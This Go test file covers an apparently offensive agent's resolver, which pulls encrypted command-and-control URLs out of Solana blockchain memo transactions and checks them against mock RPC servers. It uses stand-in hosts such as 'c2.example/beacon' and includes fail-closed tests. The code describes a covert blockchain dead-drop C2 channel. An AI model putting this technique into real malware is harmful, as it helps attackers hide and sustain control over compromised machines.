//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func encryptMemoForTest(t *testing.T, token, memo string) string {
	t.Helper()
	key := sha256.Sum256([]byte(token))
	block, err := aes.NewCipher(key[:])
	if err != nil {
		t.Fatal(err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		t.Fatal(err)
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		t.Fatal(err)
	}
	return base64.StdEncoding.EncodeToString(gcm.Seal(nonce, nonce, []byte(memo), nil))
}

func TestParseMemoURLs(t *testing.T) {
	memo := "https://a.example/x\nhttps://b.example/y, http://c.example/z\nftp://bad https://a.example/x"
	got := parseMemoURLs(memo)
	if len(got) != 3 {
		t.Fatalf("urls = %v", got)
	}
	if got[0] != "https://a.example/x" || got[2] != "http://c.example/z" {
		t.Fatalf("bad urls: %v", got)
	}
	if got := parseMemoURLs("not a url"); len(got) != 0 {
		t.Fatalf("accepted non-url: %v", got)
	}
}

func TestDecryptSolanaMemo(t *testing.T) {
	memo := "https://c2.example/beacon"
	enc := encryptMemoForTest(t, "agent-token", memo)
	plain, err := decryptSolanaMemo(enc, "agent-token")
	if err != nil || plain != memo {
		t.Fatalf("decrypt = %q err=%v", plain, err)
	}
	if _, err := decryptSolanaMemo(enc, "wrong-token"); err == nil {
		t.Fatal("wrong token decrypted memo (GCM auth failed to reject)")
	}
	if _, err := decryptSolanaMemo("!!!not-base64", "agent-token"); err == nil {
		t.Fatal("bad base64 accepted")
	}
}

func TestResolveSolanaC2OverHTTP(t *testing.T) {
	enc := encryptMemoForTest(t, "tok", "https://recovered.example/solana")
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var req struct {
			Method string `json:"method"`
		}
		_ = json.NewDecoder(r.Body).Decode(&req)
		var result interface{}
		switch req.Method {
		case "getSignaturesForAddress":
			result = []map[string]string{{"signature": "sig-1"}}
		case "getTransaction":
			result = map[string]interface{}{
				"transaction": map[string]interface{}{
					"message": map[string]interface{}{
						"instructions": []map[string]string{
							{"programId": "SomeOtherProgram", "data": enc},
							{"programId": solanaMemoProgram, "data": enc},
						},
					},
				},
			}
		default:
			result = nil
		}
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"result": result})
	}))
	defer server.Close()

	spec := c2ResolverSpec{
		Kind:    c2ResolverKindSolana,
		RPCs:    []string{server.URL},
		Address: "watched-account",
		Token:   "tok",
		Cap:     4,
	}
	urls, err := resolveSolanaC2(server.Client(), spec)
	if err != nil || len(urls) != 1 || urls[0] != "https://recovered.example/solana" {
		t.Fatalf("resolved = %v err=%v", urls, err)
	}
}

func TestResolveSolanaC2FailClosed(t *testing.T) {
	// Wrong token: memo exists but cannot be decrypted.
	enc := encryptMemoForTest(t, "right-token", "https://c2.example")
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var req struct {
			Method string `json:"method"`
		}
		_ = json.NewDecoder(r.Body).Decode(&req)
		var result interface{}
		if req.Method == "getSignaturesForAddress" {
			result = []map[string]string{{"signature": "s"}}
		} else {
			result = map[string]interface{}{"transaction": map[string]interface{}{
				"message": map[string]interface{}{"instructions": []map[string]string{
					{"programId": solanaMemoProgram, "data": enc},
				}},
			}}
		}
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"result": result})
	}))
	defer srv.Close()
	spec := c2ResolverSpec{Kind: c2ResolverKindSolana, RPCs: []string{srv.URL}, Address: "a", Token: "wrong", Cap: 4}
	if urls, err := resolveSolanaC2(srv.Client(), spec); err == nil || len(urls) != 0 {
		t.Fatalf("wrong token should fail closed: %v %v", urls, err)
	}

	// Non-200 RPC fails closed.
	bad := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusBadGateway)
	}))
	defer bad.Close()
	spec.RPCs = []string{bad.URL}
	if urls, err := resolveSolanaC2(bad.Client(), spec); err == nil || len(urls) != 0 {
		t.Fatalf("non-200 should fail closed: %v %v", urls, err)
	}
}

func TestParseC2ResolverSpecSolana(t *testing.T) {
	_, err := parseC2ResolverSpec(`{"kind":"solana","rpc":"http://insecure","address":"a","token":"t"}`)
	if err == nil || !strings.Contains(err.Error(), "https") {
		t.Fatalf("non-https solana rpc accepted: %v", err)
	}
	got, err := parseC2ResolverSpec(`{"kind":"solana","rpc":"https://rpc","address":"a","token":"t"}`)
	if err != nil || len(got.RPCs) != 1 || got.Cap != 4 {
		t.Fatalf("solana spec = %+v err=%v", got, err)
	}
}
